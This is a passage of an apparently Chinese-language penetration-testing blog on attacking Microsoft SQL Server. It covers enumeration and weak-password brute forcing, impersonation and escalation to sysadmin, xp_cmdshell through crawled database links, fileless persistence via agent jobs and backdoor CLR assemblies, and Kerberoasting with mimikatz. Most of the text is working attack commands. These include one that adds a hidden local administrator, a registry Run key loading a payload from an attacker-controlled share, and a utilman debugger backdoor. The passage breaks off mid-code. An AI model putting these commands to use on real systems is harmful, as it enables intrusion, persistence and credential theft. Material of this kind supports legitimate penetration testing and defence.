class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(1)</span><br><span class="line">SELECT SUSER_NAME(2)</span><br><span class="line">SELECT SUSER_NAME(3)</span><br><span class="line">SELECT SUSER_NAME(4)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/images/image77.png"></p><h4 id="猜测密码"><a href="#猜测密码" class="headerlink" title="猜测密码"></a>猜测密码</h4><p>使用PowerUpSQL尝试对那些已识别出的的SQL Server登录名使用弱口令爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName &#x2F;&#x2F;PowerUpSQL Blind SQL登录枚举</span><br><span class="line">Invoke-SQLAuditWeakLoginPw</span><br></pre></td></tr></table></figure><h4 id="获取当前域内用户名"><a href="#获取当前域内用户名" class="headerlink" title="获取当前域内用户名"></a>获取当前域内用户名</h4><p>public角色可以获取当前域信息，有利用盲猜域内其他组SID或用户名。 获取SQL Server所在的域:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEFAULT_DOMAIN() as mydomain</span><br></pre></td></tr></table></figure><p><img src="/images/image78.png"><br>获取域内用户的完整SID。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#39;&lt;Identified_Domain&gt;\Domain Admins&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image79.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619851040000</span><br></pre></td></tr></table></figure><p>获取域内Admins组的完整RID。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#39;&lt;Identified_Domain&gt;\Domain Admins&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image80.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619800020000</span><br></pre></td></tr></table></figure><p>抓取完整RID的前48个字节以获取域的SID。通过将十六进制数字值附加到先前的SID来创建新的RID（将与域对象相关联）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RID&#x3D;0x010500000000000515000000CAAE870FA5F89ACD856A619851040000 SELECT SUSER_NAME(RID) &#x2F;&#x2F;获取与RID关联的域对象名称。</span><br></pre></td></tr></table></figure><p>PowerUpSQL也可盲猜域帐户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName</span><br></pre></td></tr></table></figure><h3 id="利用Public获得更多权限"><a href="#利用Public获得更多权限" class="headerlink" title="利用Public获得更多权限"></a>利用Public获得更多权限</h3><p>在具有对SQL Server的Public权限账号的上下文中，最常用的获取执行权限的方法是:</p><ul><li>特权模拟</li><li>存储过程和触发器创建/注入</li><li>写入存储过程的自动执行</li><li>SQL Server代理任务</li><li>xp_cmdshell</li><li>创建数据库链接到文件或服务器</li><li>导入/安装自定义CLR程序集</li><li>临时查询</li><li>共享服务帐户</li><li>数据库链接</li><li>UNC路径注入</li><li>Python/R脚本执行。</li></ul><p>以上大部分内容在SQL Server常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。</p><h4 id="特权模拟"><a href="#特权模拟" class="headerlink" title="特权模拟"></a>特权模拟</h4><p>SQL Server中有一个特权/权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询/命令，但必须将数据库配置为允许OS命令执行对象。</p><h4 id="EXECUTE-AS语句"><a href="#EXECUTE-AS语句" class="headerlink" title="EXECUTE AS语句"></a>EXECUTE AS语句</h4><p>默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行 权限检查。当一个EXECUTE AS语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切 换之后，将针对该帐户的登录名和用户安全性令牌而不是调用EXECUTE AS语句的人员检查权限。本质 上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。<br>使用public角色用户testuser，手动检查是否是sa登录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) &#x2F;&#x2F;检查SQL Server 登录名是否为指定服务器角色的成员。</span><br></pre></td></tr></table></figure><p><img src="/images/image81.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE AS LOGIN &#x3D; &#39;sa&#39; &#x2F;&#x2F;模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。</span><br></pre></td></tr></table></figure><p><img src="/images/image82.png"><br>再次使用public角色用户testuser，手动检查目前模拟为sa登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image83.png"></p><h4 id="存储过程和触发器创建-注入"><a href="#存储过程和触发器创建-注入" class="headerlink" title="存储过程和触发器创建/注入"></a>存储过程和触发器创建/注入</h4><p>开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上 下文中执行。这些存储过程可以作为数据库的所有者(拥有所有者的EXECUTE AS)来执行，以使它可以 访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度 来看，采用此方法有一些缺点:：</p><ul><li>无法精细控制数据库所有者的权限。</li><li>普通帐户或sysadmin帐户通常拥有数据库。</li></ul><p>DB_OWNER角色可以使用EXECUTE AS OWNER在sa或sysadmin帐户的上下文中执行。如果这些存储过 程实现不安全，则可以通过扩展存储过程来通过SQL注入或命令注入进行模拟。例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE test2</span><br><span class="line">GO</span><br><span class="line">CREATE PROCEDURE test_imitation2</span><br><span class="line">WITH EXECUTE AS OWNER</span><br><span class="line">AS</span><br><span class="line">EXEC sp_addsrvrolemember &#39;testuser&#39;,&#39;sysadmin&#39;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>必须将数据库配置为值得信赖的OS命令执行程序。虽然可以通过SQL或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。</p><p><img src="/images/image84.png"></p><p>攻击场景:<br>DBA对Web应用程序执行以下操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE LOGIN somebody WITH PASSWORD &#x3D; &#39;Password123&#39;; &#x2F;&#x2F;为WebApp创建SQL登录名。 USE test</span><br><span class="line">ALTER LOGIN [somebody] with default database &#x3D; [test];</span><br><span class="line">CREATE USER somebody FROM LOGIN [somebody];</span><br><span class="line">EXEC sp_addrolemember [db_owner], [somebody]; &#x2F;&#x2F;为此SQL登录名分配db_owner角色。 Webapp可以从数据库访问所需的任何内容。</span><br><span class="line">ALTER DATABASE CurrentDB SET TRUSTWORTHY ON &#x2F;&#x2F;将数据库设置为可信任的访问外部资源。</span><br></pre></td></tr></table></figure><p>可以在查询中识别此类数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM</span><br><span class="line">sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id &#x3D;</span><br><span class="line">m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id &#x3D;</span><br><span class="line">m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) &#x3D;</span><br><span class="line">p.name WHERE is_trustworthy_on &#x3D; 1 AND d.name NOT IN (&#39;MSDB&#39;) and r.type &#x3D; &#39;R&#39;</span><br><span class="line">and r.name &#x3D; N&#39;sysadmin&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image85.png"></p><p>可以使用以下metasploit模块自动进行探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_escalate_dbowner</span><br><span class="line">auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_escalate_dbowner_sqi</span><br></pre></td></tr></table></figure><p><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">更多方法可参考NetSpi博客</a></p><h4 id="服务帐户"><a href="#服务帐户" class="headerlink" title="服务帐户"></a>服务帐户</h4><p>SQL Server所有版本都为服务帐户提供sysadmin特权。<br>列出常见的一些服务帐户类型:</p><ul><li>域用户</li><li>本地用户</li><li>本地系统</li><li>网络服务</li><li>本地托管服务帐户</li><li>域托管服务帐户</li></ul><p>PowerUpSQL的Invoke-SQLOSCMD可用于基本命令执行。<br>对于单个主机实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SQLOSCMD –Verbose –Instance &quot;server1\instance1&quot; –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>对于域内实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>如果我们攻击了一个SQL Server，那么我们也将使用该共享帐户来攻击所有SQL Server。</p><h4 id="爬数据库链接"><a href="#爬数据库链接" class="headerlink" title="爬数据库链接"></a>爬数据库链接</h4><p>数据库链接(Database Link)本质上是两个服务器之间的持久连接。数据库链接(Database Link)的 作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。<br>Public角色使用openquery()函数，对被链接的数据库服务器进行查询;也可以执行xp_cmdshell，对远 程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。<br>下图简单说明当数据库对链接查询功能配置过高特权时，注入的payload是如何被传递:</p><p><img src="/images/image86.jpeg"></p><p>列出所有链接的服务器名，通常有两个选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_linkedservers</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvname FROM master..syservers</span><br></pre></td></tr></table></figure><p><img src="/images/image87.png"></p><p>查询一个服务器的所有链接的服务器名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#39;select srvname FROM master..sysservers&#39;)</span><br></pre></td></tr></table></figure><p>查询一个服务器的某个链接的服务器所链接的服务器名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#39;select srvname FROM openquery(HVA, &quot;SELECT</span><br><span class="line">srvname FROM master..syservers&quot;)&#39;)</span><br></pre></td></tr></table></figure><p>查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM openquery(DB1, &#39;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec</span><br><span class="line">xp_cmdshell&#39;&quot;&#39;ping 192.168.1.1&quot;&quot; &#39;&#39;)&#39;)</span><br></pre></td></tr></table></figure><p>SQL Server 2005存在链接爬网命令执行漏洞，使用msf的mssql_linkcrawler模块可获得反弹shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler</span><br></pre></td></tr></table></figure><p><img src="/images/image88.jpeg"><br><img src="/images/image89.jpeg"></p><p>自动化爬网的工具：</p><ul><li><a href="https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler">mssql_linkcrawler</a></li><li><a href="https://blog.netspi.com/sql-server-link-crawling-powerupsql/">PowerUpSQL</a></li><li>……</li></ul><h3 id="从系统管理员到Sysadmin"><a href="#从系统管理员到Sysadmin" class="headerlink" title="从系统管理员到Sysadmin"></a>从系统管理员到Sysadmin</h3><p>首先先了解三个点：</p><ul><li>SQL Server较旧的版本为本地管理员提供sysadmin特权</li><li>SQL Server较旧的版本为本地系统提供sysadmin特权</li><li>SQL Server所有版本都为SQL Server服务帐户提供sysadmin特权</li></ul><p>以下是利用点和常用工具列表：</p><table><thead><tr><th>利用点</th><th>SQL Server 2000</th><th>SQL Server 2005</th><th>SQL Server 2008</th><th>SQL Server 2012</th><th>SQL Server 2014</th><th>SQL Server 2016</th></tr></thead><tbody><tr><td>服务凭证</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>本地管理员</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>本地系统</td><td>√</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>SQL Server进程 注入</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>令牌窃取</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>单用户模式</td><td>?</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>附PowerUpSQL一些执行命令：</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>SQL Server帐户的域用户。 以域用户身份运行时，此功能将自动执行4 件事。1.通过LDAP查询到DC的SPN来识别域上的SQL Server。2.尝试登 录每个。3.使用多种方法 执行UNC路径注入。4.尝 试捕获关联的SQL Server 服务帐户的密码哈希。</td><td>Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12</td></tr><tr><td>通过服务帐户模拟将OS管理员转换为sysadmin，然后所有PowerUpSQL命令都可以以sysadmin身份运行。</td><td>Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL</td></tr><tr><td>审核问题</td><td>Invoke-SQLAudit -Verbose -Instance SQLServer1</td></tr><tr><td>升级到sysadmin</td><td>Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1</td></tr><tr><td>执行OS命令: xp_cmdshell</td><td>$Targets | Invoke-SQLOSCmd -Verbose -Command “Whoami” - Threads 10</td></tr><tr><td>执行OS命令:自定义扩 展存储过程</td><td>Create-SQLFileXpDll -OutFile c:    emp\test.dll -Command “echo test &gt; c:\temp\test.txt” -ExportName xp_test -Verbose Get-SQLQuery - Verbose -Query “sp_addextendedproc ‘xp_test’, ‘\yourserver\yourshare\myxp.dll’” xp_test sp_dropextendedproc ‘xp_test’</td></tr><tr><td>执行OS命令:CLR</td><td>$Targets | Invoke-SQLOSCLR -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:Ole自动化 过程</td><td>$Targets | Invoke-SQLOSOle -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:外部脚本- R</td><td>$Targets | Invoke-SQLOSR -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:外部脚本- Python</td><td>$Targets | Invoke-SQLOSPython -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:代理作业- CmdExec</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command “echo hello &gt; c:\windows    emp\test1.txt”</td></tr><tr><td>执行OS命令:代理作业- PowerShell</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command ‘write-output “hello world”</td></tr><tr><td>执行OS命令:代理作业- VBScript</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows    emp\test3.txt’</td></tr><tr><td>执行OS命令:代理作业- JScript</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows    emp\test3.txt’</td></tr><tr><td>检索数据库链接</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1</td></tr><tr><td>检索数据库链接并执行查 询</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query “select name from master..sysdatabases”</td></tr><tr><td>抓取数据库链接并执行OS命令</td><td>Get-SQLCrawl -instance “SQLSERVER1\Instance1” -Query “exec master..xp_cmdshell ‘whoami’”</td></tr><tr><td>转储代理任务的内容。通常包含密码。详细输出包括作业摘要数据。</td><td>$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password ‘123qweASD’</td></tr><tr><td>枚举所有SQL登录名作为最低特权用户，并测试用户名作为密码。</td><td>针对单个服务器 Invoke-SQLAuditWeakLoginPw -Verbose - Instance SQLServer1\Instance1 运行针对域SQL Server运行 $WeakPasswords = Get-SQLInstanceDomain -Verbose</td></tr></tbody></table><hr><h2 id="SQL-Server权限维持"><a href="#SQL-Server权限维持" class="headerlink" title="SQL Server权限维持"></a>SQL Server权限维持</h2><p>利用SQL Server设置权限维持方法，主要还是靠SQL Server代理作业，定期执行计划任务。为了实现无文件攻击，还利用CLR程序集功能，加载恶意DLL文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。<br>此持久化有几个前提条件:</p><ul><li>启动SQL Server代理服务</li><li>开启CLR功能 </li><li>将存储.Net程序集的数据库配置为可信赖的</li></ul><p>以上均在SQL Server代理执行计划任务和SQL Server CLR相关利用详细介绍。</p><h3 id="高隐蔽性持久化"><a href="#高隐蔽性持久化" class="headerlink" title="高隐蔽性持久化"></a>高隐蔽性持久化</h3><p>连接SQL Server数据库后，创建SQL Server代理作业，定时执行SQL语句调用恶意的用户自定义存储过程或函数利用SQL语句将CLR程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的CLR程序集。已创建的SQL Server代理作业，定期执行计划任务，调用CLR程序集，实现无文件持 久化。<br>首先创建名为CreateWarSQLKit的存储过程(WarSQLKit相关的利用可查看第二章中SQL ServerCLR相关利用的WarSQLKit篇章)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">CREATE procedure CreateWarSQLKit as</span><br><span class="line">    CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET &#x3D; UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image91.png"></p><p>创建SQL Server代理作业，定期执行CreateWarSQLKit，实现WarSQLKit的DLL文件持久化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name &#x3D; N&#39;test_CreateWarSQLKit_job1&#39;;</span><br><span class="line">EXEC sp_add_jobstep</span><br><span class="line">    @job_name &#x3D; N&#39;test_CreateWarSQLKit_job1&#39;,</span><br><span class="line">    @step_name &#x3D; N&#39;test_CreateWarSQLKit_name1&#39;,</span><br><span class="line">    @subsystem &#x3D; N&#39;TSQL&#39;,</span><br><span class="line">    @command &#x3D; N&#39;exec CreateWarSQLKit&#39;,</span><br><span class="line">    @retry_attempts &#x3D; 5,</span><br><span class="line">    @retry_interval &#x3D; 5 ;</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;test_CreateWarSQLKit_job1&#39;;</span><br><span class="line">EXEC dbo.sp_start_job N&#39;test_CreateWarSQLKit_job1&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image92.png"></p><h3 id="其他方式实现持久化"><a href="#其他方式实现持久化" class="headerlink" title="其他方式实现持久化"></a>其他方式实现持久化</h3><p>除了正常利用SQL Server可以执行系统命令的存储过程，以下操作都是作为SQL对象存储在数据库中，并且没有任何更改到磁盘，也可以做到无文件持久化。<br>可以为utilman.exe设置调试器，该调试器将在调用cmd.exe时运行。仅sysadmins特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command</span><br><span class="line">&#39;c:\windows\system32\cmd.exe&#39; -Instance SQLServerName\InstanceName&#39;</span><br></pre></td></tr></table></figure><p>可以利用CurrentVersion \run与xp_regwrite建立。仅sysadmins特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegRun -Verbose -Name legit -Command</span><br><span class="line">&#39;\\attacker_controlled_ip\malicious.exe&#39; -Instance &#39;SQLServerName\InstanceName&#39;</span><br></pre></td></tr></table></figure><p>可以将所有自定义CLR程序集导出到DLL，最后导入后门CLR。仅sysadmins特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">$Results &#x3D; Get-SQLStoredProcedureCLR -Verbose -Instance</span><br><span class="line">&#39;SQLServerName\InstanceName&#39; -UserName sa -Password &#39;password&#39; -ExportFolder</span><br><span class="line">c:\temp</span><br><span class="line">Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe</span><br></pre></td></tr></table></figure><p>如果遇到SQLServer中的xplog70.dll文件被删除或放到其他地方了， xp_cmdshell就无法执行我们发出 的命令了。可以考虑SQLServer中有一系列与OLE相关的存储过程，这一系列的存储过程同xp_cmdshell 以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有 sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod， sp_OASetProperty，sp_OAStop。<br>可以在系统添加一个用户名为test，密码为12345678，并加入管理员组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#39;wscript.shell&#39;,@shell OUTPUT EXEC</span><br><span class="line">SP_OAMETHOD @shell,&#39;run&#39;,null, &#39;c:\windows\system32\cmd.exe &#x2F;c net user test</span><br><span class="line">12345678 &#x2F;add&#39;</span><br><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#39;wscript.shell&#39;,@shell OUTPUT  EXEC</span><br><span class="line">SP_OAMETHOD @shell,&#39;run&#39;,null, &#39;c:\windows\system32\cmd.exe &#x2F;c net  localgroup</span><br><span class="line">administrators test &#x2F;add &#39;</span><br></pre></td></tr></table></figure><p>xp_cmdshell、SP_OACREATE等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件 (DLL)都被删除了，还可以读取和修改注册表的存储过程(xp_regread、xp_regwrite)来克隆对方系 统的管理员用户。<br>PowerUpSQL命令参考:</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>将所有自定义CLR程序集导 出到DLL。它们可以脱机反 编译，并且通常包含密码。而且，无需过多努力即可将其借壳。</td><td>$Results = Get-SQLStoredProcedureCLR -Verbose - Instance Server1\Instance1 -Username sa -Password ‘P@ssword!’ -ExportFolder c:\temp $Results | Out-GridView</td></tr><tr><td>创建一个可用于导入现有(或后门)CLR程序集的 SQL命令。</td><td>Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll 博客：<a href="https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/">https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/</a></td></tr><tr><td>创建可用于导入CLR程序集以执行OS命令的DLL和SQL命令。</td><td>Create-SQLFileCLRDll -Verbose -ProcedureName runcmd - OutDir c:\temp -OutFile evil</td></tr><tr><td>获取共享SQL Server服务帐户的列表。</td><td>Get-SQLInstanceDomain -Verbose | Select-Object  DomainAccount, ComputerName -Unique | Group-Object 注意:任 何大于1的计数都表示在多个系统上使用的域帐户可能会被用于 SMB中继攻击。</td></tr></tbody></table><hr><h2 id="SQL-Server横向移动"><a href="#SQL-Server横向移动" class="headerlink" title="SQL Server横向移动"></a>SQL Server横向移动</h2><h3 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h3><p>利用传统的Kerberoast攻击方式进行横向移动，Kerberoast是一种针对Kerberos协议的攻击方式。根据 Kerberos协议，当向活动目录完成身份验证后，密钥分发中心(KDC)会将服务授权的票据(TGT)发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器(TGS)发送Kerberos票据 时，首先需要使用具有有效身份用户的票据(TGT)向票据服务器(TGS)请求乡音的服务票据。当该票据(TGT)被验证具有此服务的权限时，会向用户发送一张新的票据。新的票据使用SPN关联的计算机中的服务账号的NTLM Hash。攻击者可以尝试不同的NTLM Hash来开启Kerberos票据。NTLM Hash对应的是服务账号的密码。</p><p>实施此攻击前有几个前提条件：</p><ul><li>域内用户运行的SQL Server已经手动注册过SPN</li><li>Kerberos协议加密方式为RC4_HMAC_MD5</li></ul><p>通过SQL Server能执行PowerShell命令的利用点和导入特定功能的CLR程序集即可完成Kerberoast攻击。</p><p>查看指定域内用户所注册的SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L SEC\MSSQL2</span><br></pre></td></tr></table></figure><p><img src="/images/image93.png"></p><p>通过上文设置WarSQLKit的DLL存在sp_Mimikatz存储，执行mimikatz。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#39;sp_Mimikatz&#39;;</span><br><span class="line">select * from WarSQLKitTemp &#x2F;&#x2F;获取Mimikatz日志</span><br></pre></td></tr></table></figure><p><img src="/images/image94.png"></p><p>或者利用任何一种可以执行PowerShell命令的方式，可以请求到SPN的Kerberos票据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -</span><br><span class="line">ArgumentList &quot;MSSQLSvc&#x2F;MSSQL2.sec.com:1433&quot;</span><br><span class="line">exec xp_cmdshell &#39;powershell Add-Type -AssemblyName System.IdentityModel ; New-</span><br><span class="line">Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList</span><br><span class="line">&quot;MSSQLSvc&#x2F;MSSQL2.sec.com:1433&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image95.png"><br><img src="/images/image96.png"></p><p>之后可以使用PowerShell命令远程下载部署<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>，或者<a href="https://github.com/nidem/kerberoast">kerberoast</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mimikatz:kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure><p><img src="/images/image97.png"></p><p>导出的票据会保存到当前目录的kirbi文件。</p><p><img src="/images/image98.png"></p><p>利用<a href="https://github.com/nidem/kerberoast">kerberoast</a>中的tgsrepcrack.py脚本，离线破解NTLM Hash。<br>PowerUpSQL中使用Get-SQLServerPasswordHash，可自动提取SQL登录密码哈希：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 